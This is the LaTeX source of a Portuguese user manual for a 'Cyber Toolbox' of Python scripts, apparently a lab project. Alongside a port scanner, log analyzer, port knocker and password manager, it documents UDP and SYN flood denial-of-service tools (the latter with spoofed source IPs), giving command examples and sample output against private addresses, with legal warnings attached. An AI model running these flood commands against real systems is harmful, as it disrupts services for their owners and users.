\documentclass[11pt,a4paper]{article}
\usepackage[margin=2.5cm]{geometry}
\usepackage[T1]{fontenc}
\usepackage[utf8]{inputenc}
\usepackage{lmodern}
\usepackage{hyperref}
\usepackage{titlesec}
\usepackage{xcolor}
\usepackage{listings}
\usepackage{enumitem}

\titleformat{\section}{\Large\bfseries}{\thesection}{1em}{}
\titleformat{\subsection}{\large\bfseries}{\thesubsection}{1em}{}

\hypersetup{
  colorlinks=true,
  linkcolor=blue,
  urlcolor=blue
}

\lstdefinestyle{bash}{
  language=bash,
  basicstyle=\ttfamily\small,
  backgroundcolor=\color{gray!5},
  frame=single,
  breaklines=true,
  columns=fullflexible,
  showstringspaces=false
}

\setlist[itemize]{noitemsep, topsep=4pt}

\title{Cyber Toolbox \\ Manual do Utilizador}
\author{}
\date{\today}

\begin{document}
\maketitle
\tableofcontents
\newpage

\section{Vis\~ao Geral}
O \textbf{Cyber Toolbox} \`e um conjunto de scripts focados em an\'alise, seguran\c{c}a e administra\c{c}\~ao de sistemas. Este manual descreve o modo de utiliza\c{c}\~ao dos principais scripts e as respetivas op\c{c}\~oes.

\section{Port Scanner}
Varre portas em uma ou m\'ultiplas m\'aquinas remotas para identificar quais est\~ao abertas.

\subsection{Uso B\'asico}
\begin{lstlisting}[style=bash]
python3 port_scanner.py <alvo1,alvo2,...> <porta_inicial> <porta_final>
\end{lstlisting}

\subsection{Exemplos}
\begin{lstlisting}[style=bash]
# Escanear um alvo
python3 port_scanner.py 192.168.1.1 1 1024

# Escanear multiplos alvos
python3 port_scanner.py 192.168.1.1,192.168.1.2,google.com 80 443

# Com timeout customizado
python3 port_scanner.py 127.0.0.1 1 1024 --timeout 5

# Guardar relatorio
python3 port_scanner.py 192.168.1.1 1 1024 --output scan_report.json
\end{lstlisting}

\subsection{Caracter\'isticas}
\begin{itemize}
  \item Suporta m\'ultiplos alvos (separados por v\'irgula)
  \item Resolu\c{c}\~ao de nomes de hosts
  \item Identifica servi\c{c}os associados \`as portas abertas
  \item Timeout configur\'avel
  \item Relat\'orio em JSON (opcional)
\end{itemize}

\subsection{Output (exemplo)}
\begin{lstlisting}[style=bash]
============================================================
CYBER-TOOLBOX - VARREDOR DE PORTAS
============================================================

Varrendo 192.168.1.1 (192.168.1.1) - Portas 1 a 1024
------------------------------------------------------------
Porta 22    aberta (ssh)
Porta 80    aberta (http)
Porta 443   aberta (https)

RELATORIO FINAL
============================================================

192.168.1.1 (192.168.1.1)
   Portas abertas: 22, 80, 443

Varrimento concluido em 45.32s
\end{lstlisting}

\section{UDP Flooder}
Envia pacotes UDP para simular um ataque de nega\c{c}\~ao de servi\c{c}o (DoS).

\subsection{Uso B\'asico}
\begin{lstlisting}[style=bash]
python3 udp_flooder.py --target <ALVO> [OPTIONS]
\end{lstlisting}

\subsection{Op\c{c}\~oes}
\begin{lstlisting}[style=bash]
--target, -t      Alvo (IP ou hostname) [obrigatorio]
--port, -p        Porta UDP (default: 53)
--duration, -d    Duracao em segundos (default: 10)
--packet-size, -s Tamanho do pacote em bytes (default: 1472)
--threads, -n     Numero de threads (default: 4)
\end{lstlisting}

\subsection{Exemplos}
\begin{lstlisting}[style=bash]
# Flood basico (DNS - porta 53)
python3 udp_flooder.py --target 192.168.1.1

# Flood em porta NTP (123) por 30 segundos
python3 udp_flooder.py --target 192.168.1.1 --port 123 --duration 30

# Flood com 8 threads
python3 udp_flooder.py --target 192.168.1.1 --threads 8

# Flood com pacotes grandes
python3 udp_flooder.py --target 192.168.1.1 --packet-size 65535
\end{lstlisting}

\subsection{Aviso Legal}
Este script \`e \textbf{apenas} para fins educacionais em ambientes autorizados (laboratorial). O uso n\~ao autorizado \`e ilegal e pode violar leis de seguran\c{c}a inform\'atica.

\section{SYN Flooder}
Envia pacotes TCP SYN para simular um ataque de nega\c{c}\~ao de servi\c{c}o (SYN Flood/DoS) contra servi\c{c}os HTTP, SMTP ou outros.

\subsection{Requisitos}
\begin{lstlisting}[style=bash]
# Requer Scapy para manipulacao de pacotes raw
pip install scapy

# Requer privilegios de root/administrator
sudo python3 syn_flooder.py --target <ALVO> [OPTIONS]
\end{lstlisting}

\subsection{Uso B\'asico}
\begin{lstlisting}[style=bash]
python3 syn_flooder.py --target <ALVO> [OPTIONS]
\end{lstlisting}

\subsection{Op\c{c}\~oes}
\begin{lstlisting}[style=bash]
--target, -t    Alvo (IP ou hostname) [obrigatorio]
--port, -p      Porta TCP (default: 80/HTTP)
--duration, -d  Duracao em segundos (default: 10)
--threads, -n   Numero de threads (default: 4)
\end{lstlisting}

\subsection{Exemplos}
\begin{lstlisting}[style=bash]
# SYN Flood basico contra HTTP (porta 80)
sudo python3 syn_flooder.py --target 192.168.1.1

# SYN Flood contra SMTP (porta 25) por 30 segundos
sudo python3 syn_flooder.py --target 192.168.1.1 --port 25 --duration 30

# SYN Flood com 8 threads
sudo python3 syn_flooder.py --target 192.168.1.1 --port 443 --threads 8

# SYN Flood contra servico customizado
sudo python3 syn_flooder.py --target 192.168.1.1 --port 3306 --duration 20
\end{lstlisting}


\subsection{Caracter\'isticas}
\begin{itemize}
  \item Suporta m\'ultiplas threads para intensificar o ataque
  \item IP de origem aleat\'orio (\textit{spoof}) em cada pacote
  \item Portas de origem aleat\'orias
  \item Taxa de pacotes por segundo (pps) no relat\'orio
  \item Dura\c{c}\~ao configur\'avel
  \item Resolu\c{c}\~ao de nomes de hosts
  \item Confirma\c{c}\~ao de seguran\c{c}a antes de execu\c{c}\~ao
\end{itemize}

\subsection{Output (exemplo)}
\begin{lstlisting}[style=bash]
Alvo resolvido: 192.168.1.1 -> 192.168.1.1

============================================================
AVISO - ATAQUE SYN FLOOD (TCP)
============================================================
Esta prestes a enviar um ataque DoS para: 192.168.1.1:80 (http)
Duracao: 10s | Threads: 4

AVISOS IMPORTANTES:
  1. Este script requer privilegios de root/administrator
  2. Um ataque SYN Flood pode danificar infraestruturas criticas
  3. O uso nao autorizado e ILEGAL em muitas jurisdicoes
  4. Utilize apenas em ambientes de teste autorizados
------------------------------------------------------------

Confirma que tem autorizacao? (s/N):

Iniciando SYN Flood (TCP)
   Alvo: 192.168.1.1:80
   Duracao: 10 segundos
   Threads: 4
  Protocolo: TCP SYN (ligacoes half-open)
------------------------------------------------------------
  500 pacotes SYN enviados para 192.168.1.1:80
  1000 pacotes SYN enviados para 192.168.1.1:80
  1500 pacotes SYN enviados para 192.168.1.1:80

============================================================
RELATORIO - SYN FLOOD
============================================================
Alvo: 192.168.1.1:80
Total de pacotes SYN enviados: 5,234
Taxa de envio: 523 pps (pacotes por segundo)
Duracao real: 10.01s
Threads utilizadas: 4
============================================================
\end{lstlisting}

\subsection{Aviso Legal}
Este script \`e \textbf{apenas} para fins educacionais em ambientes autorizados (laboratorial). Um ataque SYN Flood pode danificar infraestruturas cr\'iticas e deixar sistemas inacess\'iveis. O uso n\~ao autorizado \`e \textbf{severamente ilegal} e pode resultar em penas de pris\~ao.

\section{Log Analyzer}
Analisa ficheiros de log (HTTP, SSH, UFW) para extrair informa\c{c}\~oes sobre tentativas de acesso, origem dos acessos e localiza\c{c}\~ao geogr\'afica.

\subsection{Uso B\'asico}
\begin{lstlisting}[style=bash]
python3 log_analyzer.py <ficheiro1.log> [ficheiro2.log ...] [OPTIONS]
\end{lstlisting}

\subsection{Op\c{c}\~oes}
\begin{lstlisting}[style=bash]
--geoip-db        Caminho para GeoLite2-Country.mmdb
--outdir, -o      Diretorio de output (default: reports/)
\end{lstlisting}

\subsection{Exemplos}
\begin{lstlisting}[style=bash]
# Analisar ficheiros de log
python3 log_analyzer.py /var/log/apache2/access.log

# Analisar multiplos ficheiros
python3 log_analyzer.py /var/log/apache2/access.log /var/log/auth.log

# Com resolucao de pais
python3 log_analyzer.py /var/log/auth.log --geoip-db /path/to/GeoLite2-City.mmdb

# Especificar diretorio de output
python3 log_analyzer.py /var/log/auth.log --outdir ./reports
\end{lstlisting}

\subsection{Formatos Suportados}
\begin{itemize}
  \item Apache/Nginx Combined Log: \texttt{192.168.1.1 - - [10/Oct/2000:13:55:36 -0700] "GET / HTTP/1.0" 200 1043}
  \item SSH Auth Log: \texttt{Oct 10 13:55:36 host sshd[123]: Failed password for invalid user admin from 192.168.1.1 port 53840 ssh2}
  \item UFW Firewall Log: \texttt{Oct 10 13:55:36 host UFW BLOCK IN=eth0 OUT= SRC=192.168.1.1 DST=...}
\end{itemize}

\subsection{Output (exemplo)}
\begin{lstlisting}[style=bash]
A usar BD GeoIP: /path/to/GeoLite2-City.mmdb
JSON gravado -> reports/auth_report.json
CSV gravado  -> reports/auth_report.csv

Resumo:
Servicos:
  ssh: 156
Top paises:
  China: 45
  Russia: 32
  United States: 28
\end{lstlisting}

\subsection{An\'alise Produzida}
\begin{itemize}
  \item Localiza\c{c}\~ao por pa\'is (se GeoLite2 dispon\'ivel)
  \item Origem dos acessos (IPs)
  \item Timestamps de tentativas de acesso
  \item Status de autentica\c{c}\~ao (sucesso/falha)
  \item Relat\'orios em JSON e CSV
\end{itemize}

\section{Port Knocker}
Cliente para \textit{port knocking} - t\'ecnica de abertura de porta SSH atrav\'es de uma sequ\^encia de pacotes UDP.

\subsection{Uso B\'asico}
\begin{lstlisting}[style=bash]
python3 port_knocker.py <host> <porta1> [porta2] [porta3] ...
\end{lstlisting}

\subsection{Exemplos}
\begin{lstlisting}[style=bash]
# Sequencia de knocking simples
python3 port_knocker.py 192.168.1.100 7000 8000 9000

# Com hostname
python3 port_knocker.py exemplo.com 1000 2000 3000 4000

# Uma unica porta
python3 port_knocker.py 192.168.1.100 5555
\end{lstlisting}

\subsection{Configura\c{c}\~ao da M\'aquina Alvo (Linux)}
Instale um servi\c{c}o de port knocking no servidor. Exemplo com \texttt{knockd}:

\begin{lstlisting}[style=bash]
# Instalar knockd
sudo apt-get install knockd

# Configurar /etc/knockd.conf
[options]
    logfile = /var/log/knockd.log

[openSSH]
    sequence = 7000,8000,9000
    seq_timeout = 15
    command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
    tcpflags = syn

[closeSSH]
    sequence = 9000,8000,7000
    seq_timeout = 15
    command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
    tcpflags = syn
\end{lstlisting}

\subsection{Fluxo T\'ipico}
\begin{enumerate}[itemsep=2pt]
  \item Servidor tem SSH bloqueado na firewall
  \item Cliente executa: \texttt{python3 port\_knocker.py servidor.com 7000 8000 9000}
  \item Servidor detecta a sequ\^encia de pacotes
  \item Servidor abre porta 22 (SSH) para o IP do cliente
  \item Cliente pode agora fazer SSH normalmente
\end{enumerate}

\section{Password Manager}
Gestor de passwords simples com encripta\c{c}\~ao RSA + Fernet e autentica\c{c}\~ao de 2 fatores (TOTP).

\subsection{Inicia\c{c}\~ao (Primeira Execu\c{c}\~ao)}
\begin{lstlisting}[style=bash]
python3 password_manager.py --init
\end{lstlisting}

Isto ir\'a:
\begin{itemize}
  \item Gerar par de chaves RSA
  \item Gerar segredo TOTP e URI de provisioning
  \item Criar base de dados vazia
\end{itemize}

\textbf{Importante:} Adicione o segredo TOTP \`a sua app autenticadora (Google Authenticator, Authy, Microsoft Authenticator, etc.).

\subsection{Criar Registo}
\begin{lstlisting}[style=bash]
python3 password_manager.py \
    --create \
    --url example.com \
    --user admin \
    --pass senha123
\end{lstlisting}

\subsection{Listar Registos (Requer 2FA)}
\begin{lstlisting}[style=bash]
python3 password_manager.py --list --otp 123456
\end{lstlisting}

\subsection{Visualizar um Registo (Requer 2FA)}
\begin{lstlisting}[style=bash]
python3 password_manager.py --view <id> --otp 123456
\end{lstlisting}

\subsection{Atualizar Registo (Requer 2FA)}
\begin{lstlisting}[style=bash]
python3 password_manager.py \
    --update <id> \
    --url novositeexemplo.com \
    --user novo_user \
    --pass nova_senha \
    --otp 123456
\end{lstlisting}

\subsection{Eliminar Registo (Requer 2FA)}
\begin{lstlisting}[style=bash]
python3 password_manager.py --delete <id> --otp 123456
\end{lstlisting}

\subsection{Modo Interativo}
\begin{lstlisting}[style=bash]
python3 password_manager.py
\end{lstlisting}

O menu interativo apresenta as op\c{c}\~oes para todas as opera\c{c}\~oes.

\subsection{Caracter\'isticas}
\begin{itemize}
  \item Criptografia assim\'etrica (RSA) para as chaves
  \item Criptografia sim\'etrica (Fernet) para os dados
  \item Autentica\c{c}\~ao de 2 fatores (TOTP) obrigat\'oria para acesso
  \item Opera\c{c}\~oes CRUD completas
  \item Armazenamento seguro de 3 campos: URL, utilizador, password
  \item Modo interativo ou linha de comando
\end{itemize}

\subsection{Ficheiros Criados}
\begin{lstlisting}[style=bash]
private_key.pem       (Chave privada - MANTEM SECRETO!)
public_key.pem        (Chave publica)
totp_secret.txt       (Segredo TOTP - guarde)
records.json          (Base de dados encriptada de registos)
\end{lstlisting}

\section{Iniciar via Menu Principal}
Todos os scripts podem ser executados atrav\'es do menu principal:
\begin{lstlisting}[style=bash]
python3 menu_launcher.py
\end{lstlisting}

O menu apresenta:
\begin{lstlisting}[style=bash]
======== MENU PRINCIPAL - CYBER TOOLBOX ========
1 - Port Scanner
2 - UDP Flooder
3 - SYN Flooder
4 - Log Analyzer
5 - Messenger
6 - Port Knocker
7 - Password Manager
0 - Sair
===============================================
\end{lstlisting}

\section{Depend\^encias}
Instale as depend\^encias com:
\begin{lstlisting}[style=bash]
pip install -r requirements.txt
\end{lstlisting}

Ou manualmente:
\begin{lstlisting}[style=bash]
pip install geoip2 cryptography pyotp scapy reportlab qrcode
\end{lstlisting}

\section{Nota de Seguran\c{c}a}
Alguns scripts requerem privil\'egios elevados (root/administrator) devido ao acesso a sockets brutos:
\begin{lstlisting}[style=bash]
sudo python3 syn_flooder.py --target 192.168.1.1
\end{lstlisting}


\end{document}
